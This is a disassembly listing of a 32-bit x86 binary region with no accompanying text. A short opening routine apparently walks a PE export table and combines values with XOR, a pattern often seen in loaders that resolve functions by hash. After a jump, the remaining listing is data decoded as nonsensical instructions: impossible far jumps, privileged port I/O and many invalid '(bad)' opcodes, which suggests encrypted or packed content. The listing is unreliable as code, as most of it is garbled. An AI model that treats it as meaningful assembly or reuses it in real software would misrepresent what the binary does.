  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	pop    esi
  419d84:	inc    esp
  419d85:	jbe    0x419dd0
  419d87:	cmc    
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0xd3bd192c
  419d90:	add    eax,0x1baa694b
  419d95:	lods   eax,DWORD PTR ds:[esi]
  419d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d97:	in     al,0xec
  419d99:	ret    0x7982
  419d9c:	scas   al,BYTE PTR es:[edi]
  419d9d:	xchg   ebx,eax
  419d9e:	in     al,0xc3
  419da0:	mov    al,0xed
  419da2:	adc    ch,bh
  419da4:	xchg   esi,eax
  419da5:	sbb    BYTE PTR [ebx],0xc6
  419da8:	push   cs
  419da9:	fsub   QWORD PTR [esi-0xfba297a]
  419daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419db1:	add    al,0xd5
  419db3:	sub    DWORD PTR [eax-0x5fe41a4a],edi
  419db9:	jnp    0x419d5f
  419dbb:	add    eax,0x68da3419
  419dc0:	sahf   
  419dc1:	adc    eax,0x2eb56789
  419dc6:	shl    DWORD PTR [edx],1
  419dc8:	shl    DWORD PTR [edi-0x60],0xce
  419dcc:	mov    al,0x81
  419dce:	mov    ecx,0x97587a56
  419dd3:	jge    0x419dd8
  419dd5:	mov    bh,0xd7
  419dd7:	adc    DWORD PTR [ecx],0xa3c7de20
  419ddd:	cmc    
  419dde:	inc    ebp
  419ddf:	ror    BYTE PTR [edi],0xa6
  419de2:	stc    
  419de3:	js     0x419e29
  419de5:	or     al,0x13
  419de7:	pop    es
  419de8:	dec    ebx
  419de9:	and    eax,0x1c0a0ca2
  419dee:	mov    esi,0xe5e0e81c
  419df3:	adc    DWORD PTR [edx-0x4bcd0c8b],ecx
  419df9:	or     ebp,ecx
  419dfb:	jecxz  0x419dac
  419dfd:	mov    eax,ds:0xb2f3a4f8
  419e02:	mov    BYTE PTR [edx+0x113afe5a],ch
  419e08:	cmp    eax,0x664f8b38
  419e0d:	jge    0x419dc2
  419e0f:	push   ebp
  419e10:	jae    0x419e2d
  419e12:	ins    DWORD PTR es:[edi],dx
  419e13:	mov    cl,0x78
  419e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e16:	ins    BYTE PTR es:[edi],dx
  419e17:	test   eax,0x21f6038f
  419e1c:	push   ecx
  419e1d:	or     al,BYTE PTR [edx+0x1ee22284]
  419e23:	adc    al,0xff
  419e25:	lea    edi,[ecx-0x6a]
  419e28:	jnp    0x419e61
  419e2a:	add    al,BYTE PTR [ebx]
  419e2c:	jae    0x419e79
  419e2e:	cwde   
  419e2f:	push   ds
  419e30:	jmp    0xaeda73b2
  419e35:	(bad)  
  419e36:	leave  
  419e37:	iret   
  419e38:	add    al,0x9
  419e3a:	cmp    DWORD PTR [edi],edx
  419e3c:	dec    esp
  419e3d:	jmp    0xe3f7dc43
  419e42:	aad    0x26
  419e44:	mov    BYTE PTR [eax-0x585a1a3b],bl
  419e4a:	in     al,0xa5
  419e4c:	jmp    0x419e99
  419e4e:	mov    ah,0xce
  419e50:	or     ebp,edi
  419e52:	cmp    BYTE PTR [edx-0x37],al
  419e55:	mov    ds:0x87c18c8c,eax
  419e5a:	pusha  
  419e5b:	adc    ah,0x7d
  419e5e:	jo     0x419edf
  419e60:	and    bh,cl
  419e62:	xchg   edi,eax
  419e63:	sub    dl,0xd6
  419e66:	ja     0x419e8d
  419e68:	hlt    
  419e69:	out    0x44,eax
  419e6b:	push   edi
  419e6c:	call   0xec2e:0xeadcaffa
  419e73:	(bad)  
  419e74:	scas   eax,DWORD PTR es:[edi]
  419e75:	jnp    0x419e20
  419e77:	mov    dh,BYTE PTR [edi+ebx*4+0x66]
  419e7b:	sbb    BYTE PTR [esi],bh
  419e7d:	loop   0x419e29
  419e7f:	fcmovbe st,st(2)
  419e81:	(bad)  
  419e82:	cmp    eax,0xded6bf36
  419e87:	fs fucomp st(2)
  419e8a:	sub    cl,BYTE PTR [esi+0x3e]
  419e8d:	in     al,dx
  419e8e:	pusha  
  419e8f:	or     ch,BYTE PTR [eax-0x39]
  419e92:	fdiv   st,st(3)
  419e94:	add    ebp,DWORD PTR [ebp+0x33e93a4c]
  419e9a:	sub    DWORD PTR [ebp+0x423a48c5],esi
  419ea0:	xor    BYTE PTR [ebx+0x2b],ah
  419ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ea4:	leave  
  419ea5:	xor    bh,ah
  419ea7:	pop    es
  419ea8:	arpl   WORD PTR ds:0x8e6332f7,dx
  419eae:	push   0x7f
  419eb0:	dec    esi
  419eb1:	les    ebp,FWORD PTR [edx-0x22]
  419eb4:	mov    eax,DWORD PTR [ebx-0x23]
  419eb7:	ins    BYTE PTR es:[edi],dx
  419eb8:	outs   dx,DWORD PTR ds:[esi]
  419eb9:	mov    eax,ds:0x26cf9e5
  419ebe:	adc    BYTE PTR [edi],ah
  419ec0:	sbb    al,0x56
  419ec2:	in     al,0xbf
  419ec4:	jle    0x419e9c
  419ec6:	jmp    0x64bb:0xf309638e
  419ecd:	push   edi
  419ece:	aam    0x4b
  419ed0:	jp     0x419ebd
  419ed2:	mov    BYTE PTR [eax],0xa8
  419ed5:	and    bh,BYTE PTR [ebx-0x50]
  419ed8:	shr    BYTE PTR [ebx],cl
  419eda:	add    al,0x2c
  419edc:	push   es
  419edd:	pop    ebx
  419ede:	clc    
  419edf:	or     cl,dh
  419ee1:	cwde   
  419ee2:	xor    BYTE PTR es:[eax-0x6],cl
  419ee6:	lods   eax,DWORD PTR ds:[esi]
  419ee7:	mov    dl,0x2f
  419ee9:	outs   dx,BYTE PTR ds:[esi]
  419eea:	out    dx,eax
  419eeb:	jmp    0x8c443111
  419ef0:	sti    
  419ef1:	add    eax,0xb41e38c9
  419ef6:	retf   0x43bb
  419ef9:	pop    ds
  419efa:	push   0xffffffbe
  419efc:	sar    DWORD PTR [ebx-0x28],cl
  419eff:	scas   eax,DWORD PTR es:[edi]
  419f00:	aaa    
  419f01:	xchg   edx,eax
  419f02:	xor    bh,BYTE PTR [ebx-0x59]
  419f05:	pop    esi
  419f06:	add    DWORD PTR ds:0x4bc6d031,eax
  419f0c:	inc    ebp
  419f0d:	scas   eax,DWORD PTR es:[edi]
  419f0e:	nop
  419f0f:	loopne 0x419efd
  419f11:	dec    ebp
  419f12:	sbb    DWORD PTR [esi-0x2e3f0e17],esp
  419f18:	and    cl,cl
  419f1a:	inc    bp
  419f1c:	stos   BYTE PTR es:[edi],al
  419f1d:	xchg   ebx,eax
  419f1e:	inc    edi
  419f1f:	pop    edi
  419f20:	ret    0xb689
  419f23:	lahf   
  419f24:	mov    ch,al
  419f26:	fstp   DWORD PTR [ecx+ebp*1]
  419f29:	clc    
  419f2a:	mov    dh,0xfb
  419f2c:	(bad)  
  419f2d:	icebp  
  419f2e:	push   es
  419f2f:	adc    eax,0x4b36cc89
  419f34:	sti    
  419f35:	ds mov esp,0xac80e43a
  419f3b:	adc    dl,ch
  419f3d:	cld    
  419f3e:	jl     0x419f46
  419f40:	or     eax,0x1bb105fe
  419f45:	leave  
  419f46:	ins    BYTE PTR es:[edi],dx
  419f47:	add    DWORD PTR [ebx+0x63],edi
  419f4a:	mov    ds:0xc9342831,eax
  419f4f:	or     DWORD PTR ds:0xee1a20e0,edi
  419f55:	mov    ch,0x98
  419f57:	pushf  
  419f58:	mov    BYTE PTR [ecx],dh
  419f5a:	sbb    bl,bh
  419f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f5d:	push   ecx
  419f5e:	(bad)  
  419f5f:	aad    0xe9
  419f61:	rcr    DWORD PTR [ecx+0x43],1
  419f64:	push   eax
  419f65:	pop    esp
  419f66:	in     eax,0xcc
  419f68:	mov    BYTE PTR [esi+0x1],cl
  419f6b:	inc    DWORD PTR [eax-0x7230c956]
  419f71:	hlt    
  419f72:	int3   
  419f73:	push   esp
  419f74:	bound  ebp,QWORD PTR [ecx-0x5a]
  419f77:	fnstenv [edi+0x79c6aea7]
  419f7d:	jne    0x419f8c
  419f7f:	or     eax,0xec490e46
  419f84:	out    dx,eax
  419f85:	gs arpl cx,cx
  419f88:	jge    0x419f8c
  419f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f8b:	dec    esp
  419f8c:	ins    BYTE PTR es:[edi],dx
  419f8d:	pop    ecx
  419f8e:	lahf   
  419f8f:	adc    al,0x3a
  419f91:	xor    BYTE PTR [eax+0x64e41b7c],ah
  419f97:	mov    ch,0xcb
  419f99:	js     0x419f7e
  419f9b:	(bad)  
  419f9c:	cmp    bl,dh
  419f9e:	je     0x419fb0
  419fa0:	xor    eax,0x828eaec3
  419fa5:	push   ecx
  419fa6:	mov    cl,BYTE PTR [ecx+0x4e61347d]
  419fac:	and    cl,al
  419fae:	ret    
  419faf:	pop    edx
  419fb0:	jmp    0xccbe:0x630fb358
  419fb7:	sbb    al,BYTE PTR [esi+0x24]
  419fba:	popa   
  419fbb:	pop    es
  419fbc:	jp     0x419f53
  419fbe:	push   es
  419fbf:	lds    edi,FWORD PTR [ebx]
  419fc1:	push   0x6881d02a
  419fc6:	lods   al,BYTE PTR ds:[esi]
  419fc7:	retf   
  419fc8:	sub    eax,0x75a6ff60
  419fcd:	inc    eax
  419fce:	(bad)
  419fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fd3:	lea    esp,[esi-0x19808da7]
  419fd9:	mov    edi,0x5cf60781
  419fde:	adc    al,0xca
  419fe0:	call   0xc605:0xadd69a37
  419fe7:	int    0x1e
  419fe9:	lods   al,BYTE PTR ds:[esi]
  419fea:	or     BYTE PTR ds:0x569debea,dl
  419ff0:	and    al,0x62
  419ff2:	and    ah,BYTE PTR [ebx+0x16335da0]
  419ff8:	inc    BYTE PTR [ebx+0x50]
  419ffb:	push   esi
  419ffc:	repnz (bad) 
  419ffe:	mov    ecx,ecx
  41a000:	fst    DWORD PTR [ecx+0x1eeb96d]
  41a006:	mov    dl,0x1e
  41a008:	(bad)  
  41a009:	popf   
  41a00a:	loope  0x41a064
  41a00c:	add    eax,0xebb8ccdb
  41a011:	xchg   esp,eax
  41a012:	jecxz  0x41a00e
  41a014:	or     al,0x56
  41a016:	xchg   DWORD PTR ds:0x704d4641,ebx
  41a01c:	cld    
  41a01d:	fistp  QWORD PTR [edx]
  41a01f:	lods   eax,DWORD PTR ds:[esi]
  41a020:	ss or  eax,0x7db9b462
  41a026:	push   cs
  41a027:	sub    esp,DWORD PTR [edx-0x73]
  41a02a:	dec    ecx
  41a02b:	push   eax
  41a02c:	sahf   
  41a02d:	in     eax,0x3b
  41a02f:	mov    al,ds:0x333697db
  41a034:	out    dx,eax
  41a035:	adc    DWORD PTR [esi-0x16],esp
  41a038:	out    dx,al
  41a039:	aas    
  41a03a:	sub    eax,0xfec919f1
  41a03f:	mov    al,0x8b
  41a041:	sti    
  41a042:	lock sub al,0xc4
  41a045:	stos   BYTE PTR es:[edi],al
  41a046:	cld    
  41a047:	push   esp
  41a048:	lods   eax,DWORD PTR ds:[esi]
  41a049:	jae    0x41a070
  41a04b:	cmp    al,0x27
  41a04d:	outs   dx,BYTE PTR ds:[esi]
  41a04e:	repnz sbb dl,BYTE PTR [eax]
  41a051:	outs   dx,BYTE PTR ds:[esi]
  41a052:	out    0xc1,eax
  41a054:	jmp    0xa7ae:0xe0d0983b
  41a05b:	cdq    
  41a05c:	mov    dl,0xde
  41a05e:	(bad)  
  41a05f:	scas   al,BYTE PTR es:[edi]
  41a060:	sub    al,0x62
  41a062:	repnz das 
  41a064:	pop    ebp
  41a065:	pop    es
  41a066:	or     al,0x63
  41a068:	ja     0x41a067
  41a06a:	jae    0x41a0a4
  41a06c:	rcl    BYTE PTR [eax+0x11828d5f],1
  41a072:	mov    ebx,0xc94f665b
  41a077:	sbb    al,0xe
  41a079:	ret    
  41a07a:	nop
  41a07b:	and    bh,BYTE PTR [esi-0x9f442b9]
  41a081:	fwait
  41a082:	inc    esp
  41a083:	out    dx,eax
  41a084:	lods   eax,DWORD PTR ds:[esi]
  41a085:	mov    dh,0x7d
  41a087:	les    edi,FWORD PTR [edi+0x9]
  41a08a:	inc    ebp
  41a08b:	ja     0x41a0bb
  41a08d:	xlat   BYTE PTR ds:[ebx]
  41a08e:	neg    DWORD PTR [esp+edx*4-0x7c]
  41a092:	cmp    ah,BYTE PTR [edi+0x57144f08]
  41a098:	stc    
  41a099:	test   eax,0x5dafd06b
  41a09e:	pop    ds
  41a09f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0a0:	cdq    
  41a0a1:	cmc    
  41a0a2:	mov    eax,0x1a6c7598
  41a0a7:	xchg   ebp,eax
  41a0a8:	push   esp
  41a0a9:	jmp    0x6475:0xb19021f8
  41a0b0:	(bad)  
  41a0b1:	mov    edx,0x725f0512
  41a0b6:	scas   eax,DWORD PTR es:[edi]
  41a0b7:	mov    ebx,0xa6e7a4f6
  41a0bc:	pop    es
  41a0bd:	mov    al,0x78
  41a0bf:	jne    0x41a0e0
  41a0c1:	out    0xbe,eax
  41a0c3:	mov    dl,0x8a
  41a0c5:	pop    eax
  41a0c6:	jae    0x41a136
  41a0c8:	rcr    BYTE PTR [ecx+ebx*1+0x68dcf877],cl
  41a0cf:	repz cmp cl,dh
  41a0d2:	add    al,0x8e
  41a0d4:	sub    BYTE PTR [ebp-0x723bcb85],al
  41a0da:	xchg   ebx,eax
  41a0db:	out    0x3a,eax
  41a0dd:	repz shl BYTE PTR gs:[esi+0x712a938b],cl
  41a0e5:	xchg   esi,eax
  41a0e6:	jb     0x41a122
  41a0e8:	xchg   esi,eax
  41a0e9:	cmp    DWORD PTR [ecx-0x5b],ecx
  41a0ec:	jo     0x41a0e2
  41a0ee:	int    0x9b
  41a0f0:	mov    dh,0x48
  41a0f2:	cmovle eax,DWORD PTR [edi]
  41a0f5:	push   eax
  41a0f6:	and    al,0x0
  41a0f8:	sub    esi,edx
  41a0fa:	or     eax,0xbc176875
  41a0ff:	and    al,0x70
  41a101:	bound  ecx,QWORD PTR [edi+0x7bc82097]
  41a107:	imul   ebp,DWORD PTR [eax-0xf0ed49a],0x6b
  41a10e:	mov    esp,0x21c877ef
  41a113:	mov    eax,ds:0x2041022f
  41a118:	sar    DWORD PTR [edi-0x2b],1
  41a11b:	jmp    0xbaa8:0x8fcdaf5e
  41a122:	pop    ebp
  41a123:	inc    esp
  41a124:	aaa    
  41a125:	jne    0x41a15d
  41a127:	stos   DWORD PTR es:[edi],eax
  41a128:	mov    ds,WORD PTR gs:[edi-0x4d7c9462]
  41a12f:	arpl   WORD PTR [ebx-0x70],di
  41a132:	sub    DWORD PTR ss:0x4eadb126,ebp
  41a139:	imul   ebp,DWORD PTR [edi+eax*1+0x26],0xffffff92
  41a13e:	sar    DWORD PTR [eax+0x57],0x1
  41a142:	popf   
  41a143:	out    0x78,eax
  41a145:	dec    esi
  41a146:	push   edx
  41a147:	push   edi
  41a148:	xor    al,0xaa
  41a14a:	push   es
  41a14b:	and    dl,0x34
  41a14e:	retf   
  41a14f:	xchg   esi,eax
  41a150:	loop   0x41a0f2
  41a152:	ficomp WORD PTR [esi]
  41a154:	xor    al,0xac
  41a156:	hlt    
  41a157:	sub    ebx,edi
  41a159:	imul   edi,edi,0x44
  41a15c:	xchg   ebx,eax
  41a15d:	xchg   DWORD PTR [edx+0x5f],eax
  41a160:	popa   
  41a161:	adc    ebx,edx
  41a163:	sub    ah,BYTE PTR ds:0x339c8043
  41a169:	xchg   ebx,eax
  41a16a:	xor    ah,BYTE PTR [ebx-0x6e]
  41a16d:	inc    ecx
  41a16e:	jp     0x41a189
  41a170:	mov    edi,0x597b013c
  41a175:	add    eax,DWORD PTR [esi+0x3f]
  41a178:	mov    dl,0xe
  41a17a:	inc    ebp
  41a17b:	neg    DWORD PTR [edi]
  41a17d:	std    
  41a17e:	cmp    DWORD PTR [ecx+0xf5d68c1],ebp
  41a184:	rcr    ecx,cl
  41a186:	pop    ecx
  41a187:	popa   
  41a188:	lods   eax,DWORD PTR ds:[esi]
  41a189:	mov    BYTE PTR [eax],ah
  41a18b:	add    al,0x14
  41a18d:	mov    eax,ds:0x15de100b
  41a192:	es cwde 
  41a194:	stc    
  41a195:	shr    bl,1
  41a197:	lds    esi,FWORD PTR [edx]
  41a199:	scas   al,BYTE PTR es:[edi]
  41a19a:	mov    fs,WORD PTR [ebx+edx*4]
  41a19d:	or     eax,0xbe1dbadc
  41a1a2:	push   edx
  41a1a3:	push   esp
  41a1a4:	pop    edx
  41a1a5:	fwait
  41a1a6:	jle    0x41a1fb
  41a1a8:	jo     0x41a1b8
  41a1aa:	stc    
  41a1ab:	sbb    eax,0xeb105da8
  41a1b0:	jl     0x41a198
  41a1b2:	aam    0xbb
  41a1b4:	xor    eax,0x6beee4ac
  41a1b9:	cld    
  41a1ba:	sub    bl,BYTE PTR [eax+0x2f]
  41a1bd:	les    esi,FWORD PTR [esp+edx*4]
  41a1c0:	jno    0x41a1cd
  41a1c2:	inc    edi
  41a1c3:	and    DWORD PTR [edx+0x1c],ecx
  41a1c6:	out    0x2f,al
  41a1c8:	adc    dl,cl
  41a1ca:	and    eax,0x5630b27c
  41a1cf:	push   cs
  41a1d0:	cmp    BYTE PTR [ebx],0xd
  41a1d3:	dec    ecx
  41a1d4:	into   
  41a1d5:	push   eax
  41a1d6:	fist   DWORD PTR [ecx]
  41a1d8:	and    DWORD PTR ds:0xe98ddee4,ebx
  41a1de:	retf   
  41a1df:	cmp    BYTE PTR [ebx-0x4d],ah
  41a1e2:	mov    ah,0x51
  41a1e4:	add    eax,0x7113b6d0
  41a1e9:	mov    cl,0xfd
  41a1eb:	lds    ebx,FWORD PTR [ebp+ebp*1+0x4fbd0639]
  41a1f2:	pop    esp
  41a1f3:	inc    ebp
  41a1f4:	sub    dl,ch
  41a1f6:	xchg   esi,eax
  41a1f7:	mov    ebp,0x82e24965
  41a1fc:	repnz mov DWORD PTR [ebp+0x2c],ebx
  41a200:	and    DWORD PTR [eax-0x66],ebp
  41a203:	cmp    BYTE PTR [edx],ah
  41a205:	inc    esp
  41a206:	and    eax,0x5ced407a
  41a20b:	retf   0xedc5
  41a20e:	pop    eax
  41a20f:	frstor [ebx-0x3d]
  41a212:	imul   ebp,DWORD PTR [edx+0x32],0xffffff85
  41a216:	and    esp,DWORD PTR [ebx+0x39efe774]
  41a21c:	(bad)  
  41a21d:	mov    ecx,0x35c8633
  41a222:	pop    DWORD PTR [edi+0x40]
  41a225:	jle    0x41a1b8
  41a227:	push   ebp
  41a228:	fdiv   QWORD PTR [edx]
  41a22a:	loope  0x41a286
  41a22c:	add    eax,0x27
  41a22f:	pop    es
  41a230:	mov    esp,0x96779a55
  41a235:	icebp  
  41a236:	xor    edi,DWORD PTR [ebp-0x71]
  41a239:	adc    DWORD PTR [ebx+0x12],eax
  41a23c:	xor    al,0xf7
  41a23e:	loop   0x41a205
  41a240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a241:	scas   al,BYTE PTR es:[edi]
  41a242:	dec    eax
  41a243:	outs   dx,BYTE PTR ds:[esi]
  41a244:	lea    esi,[esi]
  41a246:	out    dx,eax
  41a247:	pop    eax
  41a248:	cld    
  41a249:	or     BYTE PTR [edi+0x59],0xf7
  41a24d:	and    ebp,DWORD PTR [ebx-0x45a681c6]
  41a253:	aam    0xae
  41a255:	xchg   edx,eax
  41a256:	popf   
  41a257:	mov    esp,0x3df145ab
  41a25c:	dec    esi
  41a25d:	shr    DWORD PTR [ecx],0xed
  41a260:	inc    esi
  41a261:	xchg   esi,eax
  41a262:	(bad)  
  41a263:	jge    0x41a276
  41a265:	out    0x6b,al
  41a267:	sub    al,0xd8
  41a269:	sbb    DWORD PTR [eax+0xb],edx
  41a26c:	jge    0x41a29a
  41a26e:	mov    DWORD PTR [esp+edx*1],ecx
  41a271:	mov    cl,0xcb
  41a273:	jbe    0x41a230
  41a275:	or     al,0xff
  41a277:	lods   al,BYTE PTR ds:[esi]
  41a278:	ret    
  41a279:	push   ebp
  41a27a:	aam    0x7c
  41a27c:	ficomp DWORD PTR [ebx-0x32]
  41a27f:	and    ecx,eax
  41a281:	pop    edx
  41a282:	or     ecx,0x1c01c768
  41a288:	jb     0x41a304
  41a28a:	dec    edx
  41a28b:	sbb    BYTE PTR [esi+0x2d],0x32
  41a28f:	and    BYTE PTR [edx+0x71],cl
  41a292:	and    al,0xd0
  41a294:	jmp    0xae5c:0x61979cb0
  41a29b:	and    DWORD PTR [ecx+edx*4+0x72],ebx
  41a29f:	jge    0x41a2f2
  41a2a1:	loope  0x41a2c2
  41a2a3:	mov    ebp,0x9fc9a35a
  41a2a8:	xor    eax,0xda17db3a
  41a2ad:	or     ebx,esi
  41a2af:	cld    
  41a2b0:	adc    dh,BYTE PTR [edi+0x26f3ada9]
  41a2b6:	ins    DWORD PTR es:[edi],dx
  41a2b7:	dec    edi
  41a2b8:	mov    esi,0x38ddce47
  41a2bd:	push   ds
  41a2be:	fwait
  41a2bf:	inc    ebx
  41a2c0:	xlat   BYTE PTR ds:[ebx]
  41a2c1:	pop    ebp
  41a2c2:	sbb    al,0x41
  41a2c4:	adc    DWORD PTR [edi+edi*1],edi
  41a2c7:	xchg   esp,eax
  41a2c8:	das    
  41a2c9:	mov    bl,0x6f
  41a2cb:	cmp    BYTE PTR [ebp-0x25],bl
  41a2ce:	neg    BYTE PTR [edi+0x22]
  41a2d1:	mov    dl,BYTE PTR [ebp+0x52f50451]
  41a2d7:	jge    0x41a2c0
  41a2d9:	mov    DWORD PTR [ecx+eax*1-0x40],esi
  41a2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2de:	inc    edi
  41a2df:	inc    edi
  41a2e0:	dec    ecx
  41a2e1:	mov    esi,0x45b7e5aa
  41a2e6:	fnstsw WORD PTR [esi+0x792350dc]
  41a2ec:	add    al,0x40
  41a2ee:	adc    ebx,ebp
  41a2f0:	push   ebp
  41a2f1:	mov    dl,0x6f
  41a2f3:	int3   
  41a2f4:	mov    WORD PTR [esi-0x64],fs
  41a2f7:	pushf  
  41a2f8:	f2xm1  
  41a2fa:	adc    al,0x6d
  41a2fc:	fsubr  QWORD PTR [ebx+0x76]
  41a2ff:	ret    
  41a300:	aam    0x79
  41a302:	addr16 pop ds
  41a304:	pop    ecx
  41a305:	and    BYTE PTR [ebx+0x3e],ah
  41a308:	adc    eax,0x24014298
  41a30d:	mov    ebp,0x716fad7c
  41a312:	xchg   esi,eax
  41a313:	mov    BYTE PTR [ebx],0x5c
  41a316:	push   cs
  41a317:	ja     0x41a2ff
  41a319:	mov    bh,0xef
  41a31b:	cdq    
  41a31c:	mov    dh,0x67
  41a31e:	sub    eax,0x1fd45e1e
  41a323:	and    DWORD PTR [ecx+0x5d],0xb92d4e76
  41a32a:	jmp    0x3c9ace89
  41a32f:	gs mov ch,0x28
  41a332:	mov    ebx,ss
  41a334:	test   DWORD PTR [ebx],esp
  41a336:	mov    ebx,0xc197528f
  41a33b:	in     al,dx
  41a33c:	jns    0x41a342
  41a33e:	(bad)  
  41a33f:	out    dx,al
  41a340:	test   BYTE PTR ds:0x8f793552,dl
  41a346:	mov    ah,0x44
  41a348:	pop    edi
  41a349:	jle    0x41a357
  41a34b:	aam    0x70
  41a34d:	outs   dx,BYTE PTR ds:[esi]
  41a34e:	push   ebp
  41a34f:	les    eax,FWORD PTR [esi-0x4b]
  41a352:	ja     0x41a3c5
  41a354:	test   al,0xef
  41a356:	mov    ?,edi
  41a358:	xor    DWORD PTR [edi+0x56ba2b3e],esi
  41a35e:	stos   BYTE PTR es:[edi],al
  41a35f:	push   eax
  41a360:	pop    ebx
  41a361:	mov    es,ebp
  41a363:	mov    fs,esi
  41a365:	adc    bh,BYTE PTR [eax]
  41a367:	add    BYTE PTR [ebx+esi*2+0x3a],al
  41a36b:	sub    BYTE PTR [edi+0x39],bl
  41a36e:	sti    
  41a36f:	xchg   ebp,eax
  41a370:	dec    ecx
  41a371:	jae    0x41a362
  41a373:	idiv   cl
  41a375:	dec    ebx
  41a376:	mov    DWORD PTR [edx-0x1c],ebp
  41a379:	jnp    0x41a3b4
  41a37b:	cwde   
  41a37c:	out    0x68,al
  41a37e:	jnp    0x41a3cd
  41a380:	or     esp,0xb6285585
  41a386:	and    DWORD PTR [ecx+edx*4-0xa7eefa5],0x34
  41a38e:	xchg   ebx,eax
  41a38f:	pop    ebx
  41a390:	popf   
  41a391:	mov    DWORD PTR [esi+0x42],eax
  41a394:	mov    ah,0x9f
  41a396:	jge    0x41a325
  41a398:	cmp    eax,0xbe1ab08
  41a39d:	sub    DWORD PTR [ecx],0x6b14d67a
  41a3a3:	push   edx
  41a3a4:	push   esp
  41a3a5:	ins    BYTE PTR es:[edi],dx
  41a3a6:	cmp    BYTE PTR [eax],dl
  41a3a8:	sbb    BYTE PTR [eax+0x26],ch
  41a3ab:	inc    edi
  41a3ac:	iret   
  41a3ad:	ja     0x41a35e
  41a3af:	clc    
  41a3b0:	jb     0x41a3d4
  41a3b2:	je     0x41a390
  41a3b4:	dec    esi
  41a3b5:	fwait
  41a3b6:	ja     0x41a3c8
  41a3b8:	outs   dx,BYTE PTR ds:[esi]
  41a3b9:	in     al,0x98
  41a3bb:	or     al,0xa4
  41a3bd:	cmp    bh,bh
  41a3bf:	push   ss
  41a3c0:	add    al,0xa3
  41a3c2:	outs   dx,BYTE PTR ds:[esi]
  41a3c3:	call   0x7fc7:0xd8dbb2fe
  41a3ca:	inc    ecx
  41a3cb:	or     BYTE PTR [edi+0x76bf8a4c],bh
  41a3d1:	(bad)  
  41a3d3:	clc    
  41a3d4:	call   0x26bcb9de
  41a3d9:	gs jb  0x41a37e
  41a3dc:	adc    al,0x55
  41a3de:	xchg   ebx,eax
  41a3df:	fcomp  DWORD PTR [edi-0x19f99b55]
  41a3e5:	cmp    eax,0x20aacda3
  41a3ea:	retf   
  41a3eb:	xchg   BYTE PTR [esp+eax*2-0x28],dl
  41a3ef:	fs repz into 
  41a3f2:	gs lock pop eax
  41a3f5:	jae    0x41a447
  41a3f7:	mov    edi,0x93539536
  41a3fc:	push   0x1d4d9e63
  41a401:	cmp    eax,0x61c0906
  41a406:	repz das 
  41a408:	cmc    
  41a409:	jo     0x41a3a4
  41a40b:	imul   ch
  41a40d:	addr16 shr bh,cl
  41a410:	(bad)  
  41a411:	sub    BYTE PTR [edi-0x58],0xf7
  41a415:	push   ecx
  41a416:	lods   al,BYTE PTR ds:[esi]
  41a417:	jle    0x41a48b
  41a419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a41a:	outs   dx,BYTE PTR ds:[esi]
  41a41b:	pop    esi
  41a41c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a41d:	popa   
  41a41e:	scas   al,BYTE PTR es:[edi]
  41a41f:	icebp  
  41a420:	rcl    ah,0xd2
  41a423:	daa    
  41a424:	mov    ds:0xed00f61,al
  41a429:	std    
  41a42a:	retf   0xebf1
  41a42d:	(bad)  
  41a42f:	sub    eax,0x5693a1e2
  41a434:	add    DWORD PTR [esi+0x0],edx
  41a437:	push   edi
  41a438:	xor    BYTE PTR [esi+0x196f8767],cl
  41a43e:	ret    0x1250
  41a441:	fcom   DWORD PTR [esi-0x1d]
  41a444:	cmp    dh,dl
  41a446:	in     al,dx
  41a447:	mov    dh,BYTE PTR [ebx]
  41a449:	mov    ebx,0xbe54562c
  41a44e:	cmp    DWORD PTR [ebx-0xf08b25e],ebp
  41a454:	inc    edi
  41a455:	lods   eax,DWORD PTR ds:[esi]
  41a456:	pop    esi
  41a457:	pop    edx
  41a458:	push   0xb97b39ba
  41a45d:	push   edx
  41a45e:	or     al,BYTE PTR [edx+0x7e]
  41a461:	pop    edx
  41a462:	mov    cl,0x46
  41a464:	mov    cl,0x1b
  41a466:	jg     0x41a40a
  41a468:	adc    eax,0xe4e5dd31
  41a46d:	ds in  eax,0x19
  41a470:	in     eax,dx
  41a471:	jae    0x41a46e
  41a473:	(bad)  
  41a475:	idiv   cl
  41a477:	push   ebp
  41a478:	xor    dl,ah
  41a47a:	add    al,0xce
  41a47c:	mov    eax,ds:0x12e17648
  41a481:	cmp    al,0x61
  41a483:	mov    bl,0xf0
  41a485:	add    BYTE PTR [esi],0xba
  41a488:	into   
  41a489:	test   eax,0x2f1c46de
  41a48e:	cmp    esp,DWORD PTR [ecx-0x43]
  41a491:	jo     0x41a416
  41a493:	sar    BYTE PTR [edx-0x2],1
  41a496:	mov    edi,0xd34a3b56
  41a49b:	mov    eax,0x8c367fb4
  41a4a0:	jecxz  0x41a43c
  41a4a2:	(bad)  
  41a4a3:	fcomp  DWORD PTR [eiz*2-0x1011d87a]
  41a4aa:	fdiv   st,st(4)
